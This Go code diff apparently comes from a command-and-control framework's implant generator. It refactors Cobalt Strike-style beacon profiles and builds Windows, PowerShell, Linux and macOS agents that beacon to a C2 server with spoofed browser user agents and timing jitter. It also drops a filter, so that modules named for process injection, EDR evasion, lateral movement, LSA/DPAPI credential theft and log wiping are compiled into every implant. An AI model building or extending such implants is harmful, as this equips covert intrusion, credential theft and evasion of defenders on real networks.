@@ -8,7 +8,9 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
+	"sort"
 	"strings"
 	"text/template"
 )
@@ -71,29 +73,43 @@ func getGoCmd() (string, error) {
 	return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable to the full path of go.exe/go")
 }
 
-// loadMalleableProfile loads a profile from embedded FS or falls back to default.
-func loadMalleableProfile(name string) MalleableProfile {
-	if name == "" {
-		name = "default"
+const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+func defaultMalleableProfile() MalleableProfile {
+	return MalleableProfile{
+		Name:      "default",
+		UserAgent: defaultWindowsUA,
+		BeaconURI: "/api/v1/beacon",
+		Method:    "POST",
+		Headers:   map[string]string{"Accept": "*/*"},
+		Sleep:     10,
+		Jitter:    20,
 	}
-	profilePath := fmt.Sprintf("profiles/%s.json", name)
-	data, err := payloadFS.ReadFile(profilePath)
-	if err != nil {
-		// fallback default
-		return MalleableProfile{
-			Name:      "default",
-			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-			BeaconURI: "/api/v1/beacon",
-			Method:    "POST",
-			Headers:   map[string]string{"Accept": "*/*"},
-			Sleep:     10,
-			Jitter:    20,
-		}
+}
+
+// UsesManualProfileSettings reports whether heartbeat/UA should come from the generate form.
+func UsesManualProfileSettings(profile string) bool {
+	return profile == "" || profile == "default"
+}
+
+func profileDataPath(dataDir, name string) string {
+	if dataDir == "" {
+		dataDir = "data"
 	}
+	return filepath.Join(dataDir, "profiles", name+".json")
+}
+
+func parseMalleableProfileJSON(data []byte, fallbackName string) MalleableProfile {
 	var p MalleableProfile
 	if err := json.Unmarshal(data, &p); err != nil {
-		// return default on error
-		return MalleableProfile{Name: name, BeaconURI: "/api/v1/beacon", Method: "POST"}
+		p = defaultMalleableProfile()
+		if fallbackName != "" {
+			p.Name = fallbackName
+		}
+		return p
+	}
+	if p.Name == "" {
+		p.Name = fallbackName
 	}
 	if p.BeaconURI == "" {
 		p.BeaconURI = "/api/v1/beacon"
@@ -102,6 +118,145 @@ func loadMalleableProfile(name string) MalleableProfile {
 		p.Method = "POST"
 	}
 	return p
+}
+
+// loadMalleableProfile loads a profile from data dir, embedded FS, or falls back to default.
+func loadMalleableProfile(name string, dataDir string) MalleableProfile {
+	if name == "" {
+		name = "default"
+	}
+	if data, err := os.ReadFile(profileDataPath(dataDir, name)); err == nil {
+		return parseMalleableProfileJSON(data, name)
+	}
+	profilePath := fmt.Sprintf("profiles/%s.json", name)
+	if data, err := payloadFS.ReadFile(profilePath); err == nil {
+		return parseMalleableProfileJSON(data, name)
+	}
+	p := defaultMalleableProfile()
+	p.Name = name
+	return p
+}
+
+// NormalizeImplantConfig applies profile rules:
+// - default profile: keep manual interval/jitter/UA from the form
+// - other/imported profiles: force interval/jitter/UA from the profile
+func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile {
+	if cfg.C2URL == "" {
+		cfg.C2URL = "http://127.0.0.1:8080"
+	}
+	if cfg.Protocol == "" {
+		cfg.Protocol = "http"
+	}
+
+	profile := loadMalleableProfile(cfg.Profile, dataDir)
+	cfg.BeaconURI = profile.BeaconURI
+	cfg.Method = profile.Method
+
+	if UsesManualProfileSettings(cfg.Profile) {
+		if cfg.Interval < 0 {
+			cfg.Interval = 10
+		}
+		if cfg.Jitter == 0 {
+			cfg.Jitter = 20
+		}
+		if cfg.UserAgent == "" {
+			if profile.UserAgent != "" {
+				cfg.UserAgent = profile.UserAgent
+			} else {
+				cfg.UserAgent = defaultWindowsUA
+			}
+		}
+		return profile
+	}
+
+	if profile.Sleep > 0 {
+		cfg.Interval = profile.Sleep
+	} else if cfg.Interval == 0 {
+		cfg.Interval = 10
+	}
+	cfg.Jitter = profile.Jitter
+	if profile.UserAgent != "" {
+		cfg.UserAgent = profile.UserAgent
+	} else {
+		cfg.UserAgent = defaultWindowsUA
+	}
+	return profile
+}
+
+// ListProfilePresets returns built-in and imported profile metadata for the generate UI.
+func ListProfilePresets(dataDir string) []MalleableProfile {
+	seen := map[string]bool{}
+	var out []MalleableProfile
+
+	if entries, err := payloadFS.ReadDir("profiles"); err == nil {
+		names := make([]string, 0, len(entries))
+		for _, e := range entries {
+			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
+				continue
+			}
+			names = append(names, strings.TrimSuffix(e.Name(), ".json"))
+		}
+		sort.Strings(names)
+		for _, name := range names {
+			p := loadMalleableProfile(name, dataDir)
+			out = append(out, p)
+			seen[name] = true
+		}
+	}
+
+	customDir := filepath.Join(dataDir, "profiles")
+	if entries, err := os.ReadDir(customDir); err == nil {
+		names := make([]string, 0, len(entries))
+		for _, e := range entries {
+			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
+				continue
+			}
+			name := strings.TrimSuffix(e.Name(), ".json")
+			if seen[name] {
+				continue
+			}
+			names = append(names, name)
+		}
+		sort.Strings(names)
+		for _, name := range names {
+			p := loadMalleableProfile(name, dataDir)
+			out = append(out, p)
+		}
+	}
+	return out
+}
+
+var profileNameSanitizer = regexp.MustCompile(`[^a-zA-Z0-9_-]+`)
+
+// SaveImportedProfile stores a user-uploaded profile JSON under data/profiles/.
+func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
+	p := parseMalleableProfileJSON(raw, "")
+	if p.Name == "" {
+		return p, fmt.Errorf("profile name is required")
+	}
+	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
+	if p.Name == "" {
+		return p, fmt.Errorf("invalid profile name")
+	}
+	if dataDir == "" {
+		dataDir = "data"
+	}
+	dir := filepath.Join(dataDir, "profiles")
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		return p, err
+	}
+	p.Name = strings.TrimPrefix(p.Name, "default_")
+	if p.Name == "default" {
+		return p, fmt.Errorf("cannot override built-in default profile")
+	}
+	out, err := json.MarshalIndent(p, "", "  ")
+	if err != nil {
+		return p, err
+	}
+	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
+		return p, err
+	}
+	return p, nil
 }
 
 // MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
@@ -144,28 +299,8 @@ type ImplantConfig struct {
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
 func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
-	if cfg.C2URL == "" {
-		cfg.C2URL = "http://127.0.0.1:8080"
-	}
-	if cfg.Interval == 0 {
-		cfg.Interval = 10
-	}
-	if cfg.Jitter == 0 {
-		cfg.Jitter = 20
-	}
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	}
-	profile := loadMalleableProfile(cfg.Profile)
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = profile.UserAgent
-	}
-	if cfg.Interval == 0 && profile.Sleep > 0 {
-		cfg.Interval = profile.Sleep
-	}
-	if cfg.Jitter == 0 && profile.Jitter > 0 {
-		cfg.Jitter = profile.Jitter
-	}
+	dataDir := filepath.Dir(outputDir)
+	profile := NormalizeImplantConfig(&cfg, dataDir)
 
 	// Create temp build dir
 	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
@@ -316,35 +451,8 @@ require (
 
 // GeneratePowerShellSource returns the complete PowerShell agent source code
 // after executing the external template. This is the single source of truth.
-func GeneratePowerShellSource(cfg ImplantConfig) (string, error) {
-	if cfg.C2URL == "" {
-		cfg.C2URL = "http://127.0.0.1:8080"
-	}
-	if cfg.Interval == 0 {
-		cfg.Interval = 10
-	}
-	if cfg.Jitter == 0 {
-		cfg.Jitter = 20
-	}
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	}
-	if cfg.Protocol == "" {
-		cfg.Protocol = "http"
-	}
-
-	profile := loadMalleableProfile(cfg.Profile)
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = profile.UserAgent
-	}
-	if cfg.Interval == 0 && profile.Sleep > 0 {
-		cfg.Interval = profile.Sleep
-	}
-	if cfg.Jitter == 0 && profile.Jitter > 0 {
-		cfg.Jitter = profile.Jitter
-	}
-	cfg.BeaconURI = profile.BeaconURI
-	cfg.Method = profile.Method
+func GeneratePowerShellSource(cfg ImplantConfig, dataDir string) (string, error) {
+	NormalizeImplantConfig(&cfg, dataDir)
 
 	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
 	if err != nil {
@@ -366,7 +474,7 @@ func GeneratePowerShellSource(cfg ImplantConfig) (string, error) {
 // GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
 // Internally uses the full template.
 func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
-	ps1Code, err := GeneratePowerShellSource(cfg)
+	ps1Code, err := GeneratePowerShellSource(cfg, filepath.Dir(outputDir))
 	if err != nil {
 		return "", err
 	}
@@ -397,25 +505,7 @@ func extractAgentSources(efs embed.FS, dir string) error {
 		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
 			continue
 		}
-		// Skip ICMP/SMB transport (external deps) and Windows-only files (NT syscalls etc.)
-		skipKeywords := []string{"transport_icmp_", "transport_smb_",
-			"injection_ntcreatethreadex", "injection_earlybird_", "injection_threadless_",
-			"evasion_blockdlls_", "evasion_protect_", "evasion_veh_unhook_",
-			"lateral_psexec_", "lateral_wmi_", "lateral_dcom_", "lateral_winrm_", "lateral_scf_",
-			"credentials_dpapi_", "credentials_lsa_bypass_", "credentials_adcs_", "credentials_shadow_creds_",
-			"cleanup_self_delete_", "cleanup_log_wipe_", "cleanup_track_wipe_",
-			"scanner_smb_",
-			"trans_rdp_", "trans_ssh_"}
-		skip := false
-		for _, kw := range skipKeywords {
-			if strings.Contains(entry.Name(), kw) {
-				skip = true
-				break
-			}
-		}
-		if skip {
-			continue
-		}
+		// Platform-specific sources use go:build tags; include all .go files so links resolve.
 		if entry.Name() == "agent.go" {
 			hasAgentGo = true
 		}
@@ -435,31 +525,10 @@ func extractAgentSources(efs embed.FS, dir string) error {
 
 // GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
 func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
-	if cfg.C2URL == "" {
-		cfg.C2URL = "http://127.0.0.1:8080"
-	}
-	if cfg.Interval == 0 {
-		cfg.Interval = 10
-	}
-	if cfg.Jitter == 0 {
-		cfg.Jitter = 20
-	}
-	if cfg.UserAgent == "" {
+	dataDir := filepath.Dir(outputDir)
+	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if cfg.UserAgent == defaultWindowsUA {
 		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-	}
-	if cfg.Protocol == "" {
-		cfg.Protocol = "http"
-	}
-
-	profile := loadMalleableProfile(cfg.Profile)
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = profile.UserAgent
-	}
-	if cfg.Interval == 0 && profile.Sleep > 0 {
-		cfg.Interval = profile.Sleep
-	}
-	if cfg.Jitter == 0 && profile.Jitter > 0 {
-		cfg.Jitter = profile.Jitter
 	}
 
 	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
@@ -591,31 +660,10 @@ require (
 
 // GenerateMacOS builds a macOS agent binary via cross-compilation.
 func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
-	if cfg.C2URL == "" {
-		cfg.C2URL = "http://127.0.0.1:8080"
-	}
-	if cfg.Interval == 0 {
-		cfg.Interval = 10
-	}
-	if cfg.Jitter == 0 {
-		cfg.Jitter = 20
-	}
-	if cfg.UserAgent == "" {
+	dataDir := filepath.Dir(outputDir)
+	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if cfg.UserAgent == defaultWindowsUA {
 		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
-	}
-	if cfg.Protocol == "" {
-		cfg.Protocol = "http"
-	}
-
-	profile := loadMalleableProfile(cfg.Profile)
-	if cfg.UserAgent == "" {
-		cfg.UserAgent = profile.UserAgent
-	}
-	if cfg.Interval == 0 && profile.Sleep > 0 {
-		cfg.Interval = profile.Sleep
-	}
-	if cfg.Jitter == 0 && profile.Jitter > 0 {
-		cfg.Jitter = profile.Jitter
 	}
 
 	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
